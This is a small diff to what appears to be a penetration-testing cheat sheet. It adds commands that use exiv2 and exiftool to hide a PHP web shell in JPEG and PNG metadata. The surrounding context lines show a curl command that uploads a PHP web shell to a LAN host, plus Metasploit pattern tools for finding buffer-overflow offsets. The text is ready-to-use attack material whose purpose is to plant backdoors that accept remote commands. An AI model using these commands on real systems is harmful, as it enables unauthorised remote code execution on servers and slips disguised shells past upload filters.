@@ -177,6 +177,11 @@ curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE
 ```
+#### Injecting php webshell into JPEG
+```
+exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
+exiftool “-comment<=back.php” back.png
+```
 
 #### Cracking Passwords
 
